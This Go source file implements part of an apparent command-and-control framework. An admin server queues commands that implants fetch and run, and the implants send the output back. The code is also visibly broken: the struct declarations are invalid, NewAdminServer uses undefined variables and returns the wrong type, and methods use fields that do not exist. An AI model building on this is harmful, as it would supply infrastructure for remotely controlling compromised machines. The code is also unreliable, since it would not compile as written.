package hb

import (
  "fmt"
  "errors"
  "golang.org/x/net/context"
  "github.com/alphamystic/wheagle/beacon/protos/stream"
)


type implantServer struct{
  ComandWork, Coutput chan *stream.Command
  CommandTask, Toutput chan *stream.Task
  CIntreractSession,CinteractCommandIn,CinteractCommandOut chan *stream.Session,chan *stream.Command
}

type adminServer struct{
  ComandWork, Coutput chan *stream.Command
  CommandTask, Toutput chan *stream.Task
  CIntreractSession,CinteractCommandIn,CinteractCommandOut chan *stream.Session,chan *stream.Command
}


func NewImplantServer(cwork,coutput,ctask,taskout,intcomin,intcomout chan *stream.Command,interactSession chan *stream.Session) *implantServer{
  is := new(implantServer)
  is.ComandWork = cwork
  is.Coutput = coutput
  is.CommandTask = ctask
  is.Toutput = taskout
  is.CIntreractSession = interactSession
  is.CinteractCommandIn = intcomin
  is.CinteractCommandOut = intcomout
  return is
}

func NewAdminServer(work, output chan *stream.Command) *adminServer{
  is := new(implantServer)
  is.ComandWork = cwork
  is.Coutput = coutput
  is.CommandTask = ctask
  is.Toutput = taskout
  is.CIntreractSession = interactSession
  is.CinteractCommandIn = intcomin
  is.CinteractCommandOut = intcomout
  return is
}

func (s *implantServer) FetchCommand(ctx context.Context, empty *stream.Empty)(*stream.Command,error){
  var cmd = new(stream.Command)
  select{
  case cmd,ok := <- s.work:
    if ok {
      return cmd,nil
    }
    return cmd,errors.New("Channel closed")
  default:
    return cmd,nil
  }
}

func (s *implantServer) SendOutput(ctx context.Context, result *stream.Command)(*stream.Empty,error){
  s.output <- result
  return &stream.Empty{},nil
}

func (s *adminServer) RunCommand(ctx context.Context,cmd *stream.Command) (*stream.Command,error){
  fmt.Println("[+] running command")
  var res *stream.Command
  go func(){
    s.work <- cmd
  }()
  res = <- s.output
  return res,nil
}
